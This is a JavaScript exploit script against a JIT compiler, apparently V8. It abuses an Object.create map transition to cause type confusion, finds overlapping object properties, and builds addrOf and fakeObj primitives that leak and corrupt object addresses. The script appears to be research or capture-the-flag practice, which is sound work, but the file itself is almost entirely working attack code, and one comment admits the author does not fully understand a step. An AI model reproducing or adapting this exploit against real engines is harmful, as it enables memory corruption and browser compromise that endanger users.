const LOOP_COUNT = 10000;

function makeObj(pValues) {
  // Create one inline property for triggering the CheckMaps operation
  let obj = { inline: 1234 };

  // Create 32 out-of-line properties for finding the overlapping backing store
  for (let i = 1; i < 32; i++) {
    Object.defineProperty(obj, 'p' + i, { writable: true, value: pValues[i] });
  }

  return obj;
}

let p1, p2;

function findOverlappingProperties() {
  // Create an array of all 32 property names such as p1..p32
  let pNames = [];
  for (let i = 1; i < 32; i++) {
    pNames[i] = 'p' + i;
  }

  // Create eval of our vuln function that will generate code during runtime
  eval(`
    function vuln(obj) {
      // Access inline property of obj, forcing a CheckMap operation
      obj.inline;

      // Force a Map Transition via our side-effect
      this.Object.create(obj);

      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `);

  // Create an array of negative values from -1 to -32 to be used
  // for out makeObj function
  let pValues = [];
  for (let i = 1; i < 32; i++) {
    pValues[i] = -i;
  }

  // Trigger the vuln function to find the overlapping properties
  for (let i = 0; i < LOOP_COUNT; i++) {
    let obj = makeObj(pValues); // Create an object with 32 properties, all with empty objects
    let res = vuln(obj);
    for (let i = 1; i < res.length; i++) {
      // If i is not the same value with -res[i] (we do not count the initial array before Map transition), and res[i] is between -32 and 0, it overlaps
      if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
        [p1, p2] = [i, -res[i]];
        return obj;
      }
    }
  }
  throw "[!] Failed to find overlapping properties";
}

// Conversion Buffers
let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
  floatView[0] = this;
  return uint64View[0];
};

function addrOf() {
  eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    return obj.p${p1}.x;
  }
  `);

  let objThatNeedToBeLeaked = { z: 1234 };

  // Values that will be confused
  let pValues = [];
  pValues[p1] = { x: 13.37 }; // accessed as float
  pValues[p2] = { y: objThatNeedToBeLeaked }; // accessed as JSObject and will be accessed as float <-- still not get why we need to use a different map

  // Use loop for triggering the compiler
  for (let i = 0; i < 10000; i++) {
    let obj = makeObj(pValues);
    let res = vuln(obj);
    if (res != 13.37) {
      // %DebugPrint(objThatNeedToBeLeaked);

      // Subtract 1n from address due to pointer tagging.
      return res.toBigInt() - 1n;
    }
  }
  throw "[!] AddrOf Primitive Failed"
}

function fakeObj() {
  eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    let orig = obj.p${p1}.x;
    // Overwrite property x of p1, but due to type confusion
    // we overwrite property y of p2
    obj.p${p1}.x = 0x13371337n;
    return orig;
  }
`);

  let objThatNeedToBeLeaked = { z: 1234 };
  let pValues = [];
  pValues[p1] = { x: 13.37 };
  pValues[p2] = { y: objThatNeedToBeLeaked };

  for (let i = 0; i < 10000; i++) {
    let obj = makeObj(pValues);
    let res = vuln(obj);
    if (res != 13.37) {
      // %DebugPrint(obj['p'+p1]['x']);

      uint64View[0] = res;
      return uint64View[0];
    }
  }
}

function exploit() {
  print("[+] Finding Overlapping Properties");
  findOverlappingProperties();
  print(`[+] Properties p${p1} and p${p2} overlap!`);

  // Leak address of objThatNeedToBeLeaked
  let leakedAddress = addrOf();
  print("[+] Leaking Object Address...");
  print(`[+] Object Address: 0x${leakedAddress.toString(16)}`);

  // Overwrite the leaked address with 0x13371337
  let leakedData = fakeObj();
  print("[+] Corrupting Object Address...");
  print(`[+] Leaked Data From Corrupted Address: 0x${leakedData.toString(16)}`)
}

exploit();